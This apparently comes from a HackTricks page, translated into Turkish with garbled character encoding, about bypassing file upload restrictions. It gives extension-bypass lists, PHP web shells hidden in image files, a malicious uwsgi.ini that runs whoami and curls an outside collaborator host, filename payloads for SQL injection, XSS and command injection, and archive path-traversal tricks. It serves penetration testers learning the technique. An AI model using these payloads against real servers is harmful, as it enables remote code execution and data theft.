# Dosya YÃ¼kleme

{% hint style="success" %}
AWS Hacking Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **Bize katÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya **bizi takip edin** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸÄ±n,** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

EÄŸer **hacking kariyeri** ile ilgileniyorsanÄ±z ve hacklenemez olanÄ± hacklemek istiyorsanÄ±z - **iÅŸe alÄ±yoruz!** (_akÄ±cÄ± LehÃ§e yazÄ±lÄ± ve sÃ¶zlÃ¼ gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

## Dosya YÃ¼kleme Genel Metodolojisi

DiÄŸer yararlÄ± uzantÄ±lar:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **PHPv8'de Ã‡alÄ±ÅŸma**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Erlang Yaws Web Server**: _.yaws_

### Dosya uzantÄ±sÄ± kontrollerini atlama

1. EÄŸer uygulanÄ±yorsa, **Ã¶nceki uzantÄ±larÄ± kontrol edin.** AyrÄ±ca bazÄ± **bÃ¼yÃ¼k harfler** kullanarak test edin: _pHp, .pHP5, .PhAr ..._
2. _**YÃ¼rÃ¼tme uzantÄ±sÄ±ndan Ã¶nce geÃ§erli bir uzantÄ± eklemeyi kontrol edin** (Ã¶nceki uzantÄ±larÄ± da kullanÄ±n):_
* _file.png.php_
* _file.png.Php5_
3. **Sonuna Ã¶zel karakterler eklemeyi deneyin.** TÃ¼m **ascii** ve **Unicode** karakterlerini **bruteforce** etmek iÃ§in Burp kullanabilirsiniz. (_Daha Ã¶nce belirtilen **uzantÄ±larÄ±** de kullanmayÄ± deneyebilirsiniz_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. **Sunucu tarafÄ±ndaki uzantÄ± ayrÄ±ÅŸtÄ±rÄ±cÄ±sÄ±nÄ± kandÄ±rarak korumalarÄ± atlamayÄ± deneyin**; uzantÄ±yÄ± **iki katÄ±na Ã§Ä±kararak** veya uzantÄ±lar arasÄ±nda **gereksiz** veriler (**null** baytlarÄ±) ekleyerek. _Daha iyi bir yÃ¼k oluÅŸturmak iÃ§in **Ã¶nceki uzantÄ±larÄ±** de kullanabilirsiniz._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Ã–nceki kontrol iÃ§in **bir baÅŸka uzantÄ± katmanÄ± ekleyin**:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. **GeÃ§erli uzantÄ±dan Ã¶nce exec uzantÄ±sÄ±nÄ± koymayÄ± deneyin** ve sunucunun yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ olmasÄ±nÄ± umun. (Herhangi bir uzantÄ±ya sahip olan Apache yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ±nÄ± istismar etmek iÃ§in yararlÄ±dÄ±r; _**.php**_ ile bitmeyen her ÅŸey kod Ã§alÄ±ÅŸtÄ±rÄ±r):
* _Ã¶r: file.php.png_
7. **Windows'ta NTFS alternatif veri akÄ±ÅŸÄ± (ADS)** kullanarak. Bu durumda, yasaklÄ± bir uzantÄ±dan sonra ve izin verilen bir uzantÄ±dan Ã¶nce bir iki nokta karakteri â€œ:â€ eklenecektir. SonuÃ§ olarak, sunucuda **yasaklÄ± uzantÄ±ya sahip boÅŸ bir dosya** oluÅŸturulacaktÄ±r (Ã¶rneÄŸin, â€œfile.asax:.jpgâ€). Bu dosya daha sonra baÅŸka teknikler kullanÄ±larak dÃ¼zenlenebilir, Ã¶rneÄŸin kÄ±sa dosya adÄ±nÄ± kullanarak. â€œ**::$data**â€ deseni de boÅŸ olmayan dosyalar oluÅŸturmak iÃ§in kullanÄ±labilir. Bu nedenle, bu desenin ardÄ±ndan bir nokta karakteri eklemek de daha fazla kÄ±sÄ±tlamayÄ± atlamak iÃ§in yararlÄ± olabilir (Ã¶rneÄŸin, â€œfile.asp::$data.â€)
8. Dosya adÄ± sÄ±nÄ±rlarÄ±nÄ± aÅŸmayÄ± deneyin. GeÃ§erli uzantÄ± kesilecektir. Ve kÃ¶tÃ¼ niyetli PHP kalacaktÄ±r. AAA<--SNIP-->AAA.php

```
# Linux maksimum 255 bayt
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # burada 4 Ã§Ä±karÄ±n ve .png ekleyin
# DosyayÄ± yÃ¼kleyin ve yanÄ±tÄ± kontrol edin, kaÃ§ karaktere izin verdiÄŸini. Diyelim ki 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# YÃ¼kÃ¼ oluÅŸturun
AAA<--SNIP 232 A-->AAA.php.png
```

### Ä°Ã§erik TÃ¼rÃ¼, Sihirli Numara, SÄ±kÄ±ÅŸtÄ±rma ve Yeniden BoyutlandÄ±rmayÄ± Atlama

* **Content-Type** kontrollerini atlamak iÃ§in **Content-Type** **baÅŸlÄ±ÄŸÄ±nÄ±n** **deÄŸerini** ayarlayÄ±n: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **kelime listesi**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* **Sihirli numara** kontrolÃ¼nÃ¼ atlamak iÃ§in dosyanÄ±n baÅŸÄ±na **gerÃ§ek bir gÃ¶rÃ¼ntÃ¼nÃ¼n** **baytlarÄ±nÄ±** ekleyin ( _file_ komutunu karÄ±ÅŸtÄ±rÄ±n). Veya shell'i **meta veriler** iÃ§ine yerleÅŸtirin:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` veya yÃ¼kÃ¼ doÄŸrudan bir gÃ¶rÃ¼ntÃ¼ye de **ekleyebilirsiniz**:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* EÄŸer gÃ¶rÃ¼ntÃ¼nÃ¼ze **sÄ±kÄ±ÅŸtÄ±rma ekleniyorsa**, Ã¶rneÄŸin bazÄ± standart PHP kÃ¼tÃ¼phaneleri kullanarak [PHP-GD](https://www.php.net/manual/fr/book.image.php), Ã¶nceki teknikler iÅŸe yaramayacaktÄ±r. Ancak, sÄ±kÄ±ÅŸtÄ±rmayÄ± **hayatta tutacak** bazÄ± metinler eklemek iÃ§in **PLTE parÃ§asÄ±** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanÄ±labilir.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Web sayfasÄ± ayrÄ±ca **gÃ¶rÃ¼ntÃ¼yÃ¼ yeniden boyutlandÄ±rÄ±yor** olabilir, Ã¶rneÄŸin PHP-GD fonksiyonlarÄ± `imagecopyresized` veya `imagecopyresampled` kullanarak. Ancak, sÄ±kÄ±ÅŸtÄ±rmayÄ± **hayatta tutacak** bazÄ± metinler eklemek iÃ§in **IDAT parÃ§asÄ±** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanÄ±labilir.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* GÃ¶rÃ¼ntÃ¼ yeniden boyutlandÄ±rmayÄ± **hayatta tutacak** bir yÃ¼k oluÅŸturmak iÃ§in baÅŸka bir teknik, PHP-GD fonksiyonu `thumbnailImage` kullanmaktÄ±r. Ancak, sÄ±kÄ±ÅŸtÄ±rmayÄ± **hayatta tutacak** bazÄ± metinler eklemek iÃ§in **tEXt parÃ§asÄ±** [**burada tanÄ±mlanan teknik**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) kullanÄ±labilir.
* [**Kod ile Github**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### DiÄŸer Kontrol Edilecek Ä°puÃ§larÄ±

* YÃ¼klenmiÅŸ dosyayÄ± **yeniden adlandÄ±rmak** iÃ§in bir zafiyet bulun (uzantÄ±yÄ± deÄŸiÅŸtirmek iÃ§in).
* Geri kapÄ±yÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in bir **Yerel Dosya Dahil Etme** zafiyeti bulun.
* **OlasÄ± Bilgi sÄ±zÄ±ntÄ±sÄ±**:
1. **AynÄ± dosyayÄ±** **birden fazla kez** (ve **aynÄ± anda**) **aynÄ± isimle** yÃ¼kleyin.
2. **Zaten var olan** bir **dosya** veya **klasÃ¶r** adÄ±yla bir dosya yÃ¼kleyin.
3. **â€œ.â€, â€œ..â€ veya â€œâ€¦â€** gibi bir adÄ± olan bir dosya yÃ¼kleyin. Ã–rneÄŸin, Apache'de **Windows**'ta, uygulama yÃ¼klenen dosyalarÄ± â€œ/www/uploads/â€ dizinine kaydederse, â€œ.â€ dosya adÄ± â€œ/www/â€ dizininde â€œuploadsâ€ adÄ±nda bir dosya oluÅŸturacaktÄ±r.
4. **NTFS**'te kolayca silinmeyen bir dosya yÃ¼kleyin, Ã¶rneÄŸin **â€œâ€¦:.jpgâ€**. (Windows)
5. **Windows**'ta **geÃ§ersiz karakterler** iÃ§eren bir dosya yÃ¼kleyin, Ã¶rneÄŸin `|<>*?â€` adÄ±nda. (Windows)
6. **Windows**'ta **rezerv** (**yasaklÄ±**) **adlar** iÃ§eren bir dosya yÃ¼kleyin, Ã¶rneÄŸin CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 ve LPT9.
* AyrÄ±ca, **bir yÃ¼rÃ¼tÃ¼lebilir dosya** (.exe) veya **.html** (daha az ÅŸÃ¼pheli) yÃ¼klemeyi deneyin; bu dosya, kurban tarafÄ±ndan yanlÄ±ÅŸlÄ±kla aÃ§Ä±ldÄ±ÄŸÄ±nda **kod Ã§alÄ±ÅŸtÄ±racaktÄ±r**.

### Ã–zel uzantÄ± ipuÃ§larÄ±

EÄŸer bir **PHP sunucusuna** dosya yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, [kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in **.htaccess** ipucuna bir gÃ¶z atÄ±n](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
EÄŸer bir **ASP sunucusuna** dosya yÃ¼klemeye Ã§alÄ±ÅŸÄ±yorsanÄ±z, [kod Ã§alÄ±ÅŸtÄ±rmak iÃ§in **.config** ipucuna bir gÃ¶z atÄ±n](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

`.phar` dosyalarÄ±, Java iÃ§in `.jar` gibi, ancak PHP iÃ§in kullanÄ±labilir ve **bir php dosyasÄ± gibi kullanÄ±labilir** (php ile Ã§alÄ±ÅŸtÄ±rarak veya bir script iÃ§inde dahil ederek...)

`.inc` uzantÄ±sÄ± bazen yalnÄ±zca **dosya iÃ§e aktarmak** iÃ§in kullanÄ±lan php dosyalarÄ± iÃ§in kullanÄ±lÄ±r, bu nedenle bir noktada, biri **bu uzantÄ±nÄ±n Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ±na izin vermiÅŸ olabilir**.

## **Jetty RCE**

EÄŸer bir XML dosyasÄ±nÄ± Jetty sunucusuna yÃ¼kleyebilirseniz, [**yeni \*.xml ve \*.war otomatik olarak iÅŸlenir**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Bu nedenle, aÅŸaÄŸÄ±daki resimde belirtildiÄŸi gibi, XML dosyasÄ±nÄ± `$JETTY_BASE/webapps/` dizinine yÃ¼kleyin ve shell'i bekleyin!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1047).png>)

## **uWSGI RCE**

Bu zafiyetin detaylÄ± bir keÅŸfi iÃ§in orijinal araÅŸtÄ±rmaya bakÄ±n: [uWSGI RCE Ä°stismarÄ±](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Uzak Komut YÃ¼rÃ¼tme (RCE) zafiyetleri, `.ini` yapÄ±landÄ±rma dosyasÄ±nÄ± deÄŸiÅŸtirme yeteneÄŸine sahip olan uWSGI sunucularÄ±nda istismar edilebilir. uWSGI yapÄ±landÄ±rma dosyalarÄ±, "sihirli" deÄŸiÅŸkenleri, yer tutucularÄ± ve operatÃ¶rleri dahil etmek iÃ§in belirli bir sÃ¶zdizimi kullanÄ±r. Ã–zellikle, `@(filename)` olarak kullanÄ±lan '@' operatÃ¶rÃ¼, bir dosyanÄ±n iÃ§eriÄŸini dahil etmek iÃ§in tasarlanmÄ±ÅŸtÄ±r. uWSGI'de desteklenen Ã§eÅŸitli ÅŸemalar arasÄ±nda, "exec" ÅŸemasÄ± Ã¶zellikle gÃ¼Ã§lÃ¼dÃ¼r ve bir sÃ¼recin standart Ã§Ä±ktÄ±sÄ±ndan veri okumaya olanak tanÄ±r. Bu Ã¶zellik, bir `.ini` yapÄ±landÄ±rma dosyasÄ± iÅŸlendiÄŸinde Uzak Komut YÃ¼rÃ¼tme veya Rastgele Dosya Yazma/Okuma gibi kÃ¶tÃ¼ niyetli amaÃ§lar iÃ§in manipÃ¼le edilebilir.

AÅŸaÄŸÄ±daki Ã¶rnekte, Ã§eÅŸitli ÅŸemalarÄ± gÃ¶steren zararlÄ± bir `uwsgi.ini` dosyasÄ± dÃ¼ÅŸÃ¼nÃ¼n:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
YÃ¼kleme iÅŸlemi, yapÄ±landÄ±rma dosyasÄ±nÄ±n ayrÄ±ÅŸtÄ±rÄ±lmasÄ± sÄ±rasÄ±nda gerÃ§ekleÅŸir. YapÄ±landÄ±rmanÄ±n etkinleÅŸtirilmesi ve ayrÄ±ÅŸtÄ±rÄ±lmasÄ± iÃ§in, uWSGI sÃ¼reci ya yeniden baÅŸlatÄ±lmalÄ± (potansiyel olarak bir Ã§Ã¶kme sonrasÄ± veya bir Hizmet Reddi saldÄ±rÄ±sÄ± nedeniyle) ya da dosya otomatik yeniden yÃ¼kleme ayarÄ±na getirilmelidir. Otomatik yeniden yÃ¼kleme Ã¶zelliÄŸi, etkinleÅŸtirildiÄŸinde, deÄŸiÅŸiklikleri tespit ettiÄŸinde dosyayÄ± belirli aralÄ±klarla yeniden yÃ¼kler.

uWSGI'nin yapÄ±landÄ±rma dosyasÄ± ayrÄ±ÅŸtÄ±rmasÄ±nÄ±n gevÅŸek doÄŸasÄ±nÄ± anlamak Ã§ok Ã¶nemlidir. Ã–zellikle, tartÄ±ÅŸÄ±lan yÃ¼k, bir ikili dosyaya (Ã¶rneÄŸin bir resim veya PDF) yerleÅŸtirilebilir ve potansiyel istismar kapsamÄ±nÄ± daha da geniÅŸletebilir.

## **wget Dosya YÃ¼kleme/SSRF Hilesi**

BazÄ± durumlarda, bir sunucunun **`wget`** kullanarak **dosya indirdiÄŸini** ve **URL'yi belirtebileceÄŸinizi** gÃ¶rebilirsiniz. Bu durumlarda, kod indirilen dosyalarÄ±n uzantÄ±sÄ±nÄ±n yalnÄ±zca izin verilen dosyalarÄ±n indirileceÄŸini saÄŸlamak iÃ§in bir beyaz liste iÃ§inde olup olmadÄ±ÄŸÄ±nÄ± kontrol edebilir. Ancak, **bu kontrol atlatÄ±labilir.**\
**Linux**'ta bir **dosya adÄ±** iÃ§in **maksimum** uzunluk **255** karakterdir, ancak **wget** dosya adlarÄ±nÄ± **236** karaktere kÄ±saltÄ±r. **"A"\*232+".php"+".gif"** adÄ±nda bir dosya **indirebilirsiniz**, bu dosya adÄ± **kontrolÃ¼ atlatacaktÄ±r** (bu Ã¶rnekte **".gif"** geÃ§erli bir uzantÄ±dÄ±r) ancak `wget` dosyayÄ± **"A"\*232+".php"** olarak **yeniden adlandÄ±racaktÄ±r**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
Not edin ki **baÅŸka bir seÃ§enek** bu kontrolÃ¼ atlamak iÃ§in dÃ¼ÅŸÃ¼ndÃ¼ÄŸÃ¼nÃ¼z, **HTTP sunucusunun farklÄ± bir dosyaya yÃ¶nlendirilmesi** olabilir, bÃ¶ylece baÅŸlangÄ±Ã§ URL'si kontrolÃ¼ atlayacak ve wget yÃ¶nlendirilmiÅŸ dosyayÄ± yeni adÄ±yla indirecektir. Bu **Ã§alÄ±ÅŸmayacak** **eÄŸer** wget **parametre** `--trust-server-names` ile kullanÄ±lmÄ±yorsa Ã§Ã¼nkÃ¼ **wget, yÃ¶nlendirilmiÅŸ sayfayÄ± orijinal URL'de belirtilen dosya adÄ±yla indirecektir**.

## AraÃ§lar

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) Pentesterlar ve Hata AvcÄ±larÄ± iÃ§in dosya yÃ¼kleme mekanizmalarÄ±nÄ± test etmeye yardÄ±mcÄ± olmak Ã¼zere tasarlanmÄ±ÅŸ gÃ¼Ã§lÃ¼ bir araÃ§tÄ±r. Ã‡eÅŸitli hata Ã¶dÃ¼l tekniklerini kullanarak, gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tanÄ±mlama ve istismar etme sÃ¼recini basitleÅŸtirir, web uygulamalarÄ±nÄ±n kapsamlÄ± deÄŸerlendirmelerini saÄŸlar.

## Dosya yÃ¼klemeden diÄŸer gÃ¼venlik aÃ§Ä±klarÄ±na

* **filename**'i `../../../tmp/lol.png` olarak ayarlayÄ±n ve bir **path traversal** elde etmeye Ã§alÄ±ÅŸÄ±n
* **filename**'i `sleep(10)-- -.jpg` olarak ayarlayÄ±n ve bir **SQL injection** elde edebilirsiniz
* **filename**'i `<svg onload=alert(document.domain)>` olarak ayarlayÄ±n ve bir XSS elde edin
* **filename**'i `; sleep 10;` olarak ayarlayÄ±n ve bazÄ± komut enjeksiyonlarÄ±nÄ± test edin (daha fazla [komut enjeksiyon hileleri burada](../command-injection.md))
* [**XSS** resim (svg) dosya yÃ¼klemede](../xss-cross-site-scripting/#xss-uploading-files-svg)
* **JS** dosya **yÃ¼kleme** + **XSS** = [**Service Workers** istismarÄ±](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE svg yÃ¼klemede**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Open Redirect** svg dosyasÄ± yÃ¼kleyerek](../open-redirect.md#open-redirect-uploading-svg-files)
* [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet) adresinden **farklÄ± svg payload'larÄ±** deneyin\*\*\*\*
* [ÃœnlÃ¼ **ImageTrick** gÃ¼venlik aÃ§Ä±ÄŸÄ±](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* EÄŸer **web sunucusunu bir URL'den bir resmi yakalamaya yÃ¶nlendirebilirseniz**, bir [SSRF](../ssrf-server-side-request-forgery/) istismar etmeye Ã§alÄ±ÅŸabilirsiniz. EÄŸer bu **resim** bazÄ± **kamusal** sitelerde **kaydedilecekse**, [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL belirtebilir ve **her ziyaretÃ§inin bilgilerini Ã§alabilirsiniz**.
* [PDF-Adobe yÃ¼klemesi ile **XXE ve CORS** atlatma](pdf-upload-xxe-and-cors-bypass.md)
* XSS iÃ§in Ã¶zel olarak hazÄ±rlanmÄ±ÅŸ PDF'ler: [aÅŸaÄŸÄ±daki sayfa **PDF verilerini enjekte ederek JS yÃ¼rÃ¼tme** elde etmenin nasÄ±l olduÄŸunu sunmaktadÄ±r](../xss-cross-site-scripting/pdf-injection.md). EÄŸer PDF yÃ¼kleyebilirseniz, verilen talimatlarÄ± takip ederek rastgele JS yÃ¼rÃ¼tecek bazÄ± PDF'ler hazÄ±rlayabilirsiniz.
* \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) iÃ§eriÄŸini yÃ¼kleyerek sunucunun herhangi bir **antivirÃ¼s** programÄ± olup olmadÄ±ÄŸÄ±nÄ± kontrol edin
* Dosya yÃ¼klerken herhangi bir **boyut limiti** olup olmadÄ±ÄŸÄ±nÄ± kontrol edin

Ä°ÅŸte yÃ¼kleme yaparak elde edebileceÄŸiniz ÅŸeylerin ilk 10 listesi (buradan [buraya](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: SaklÄ± XSS / SSRF / XXE
3. **GIF**: SaklÄ± XSS / SSRF
4. **CSV**: CSV enjeksiyonu
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML enjeksiyonu / XSS / AÃ§Ä±k yÃ¶nlendirme
8. **PNG / JPEG**: Piksel sel saldÄ±rÄ±sÄ± (DoS)
9. **ZIP**: LFI Ã¼zerinden RCE / DoS
10. **PDF / PPTX**: SSRF / KÃ–R XXE

#### Burp Eklentisi

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Sihirli BaÅŸlÄ±k BaytlarÄ±

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

DiÄŸer dosya tÃ¼rleri iÃ§in [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) adresine bakÄ±n.

### Zip/Tar DosyasÄ± Otomatik Olarak AÃ§Ä±lan YÃ¼kleme

EÄŸer sunucu iÃ§inde aÃ§Ä±lacak bir ZIP yÃ¼kleyebilirseniz, 2 ÅŸey yapabilirsiniz:

#### Symlink

DiÄŸer dosyalara soft linkler iÃ§eren bir baÄŸlantÄ± yÃ¼kleyin, ardÄ±ndan aÃ§Ä±lan dosyalara eriÅŸerek baÄŸlÄ± dosyalara eriÅŸeceksiniz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### FarklÄ± klasÃ¶rlerde aÃ§

AÃ§ma iÅŸlemi sÄ±rasÄ±nda dizinlerde beklenmedik dosya oluÅŸturulmasÄ± Ã¶nemli bir sorundur. Bu yapÄ±landÄ±rmanÄ±n, kÃ¶tÃ¼ niyetli dosya yÃ¼klemeleri yoluyla OS dÃ¼zeyinde komut yÃ¼rÃ¼tmeye karÅŸÄ± koruma saÄŸlayacaÄŸÄ±na dair ilk varsayÄ±mlara raÄŸmen, ZIP arÅŸiv formatÄ±nÄ±n hiyerarÅŸik sÄ±kÄ±ÅŸtÄ±rma desteÄŸi ve dizin geÃ§iÅŸ yetenekleri istismar edilebilir. Bu, saldÄ±rganlarÄ±n kÄ±sÄ±tlamalarÄ± aÅŸmasÄ±na ve hedef uygulamanÄ±n aÃ§ma iÅŸlevini manipÃ¼le ederek gÃ¼venli yÃ¼kleme dizinlerinden Ã§Ä±kmasÄ±na olanak tanÄ±r.

Bu tÃ¼r dosyalarÄ± oluÅŸturmak iÃ§in otomatik bir istismar [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc) adresinde mevcuttur. AraÃ§ aÅŸaÄŸÄ±daki gibi kullanÄ±labilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
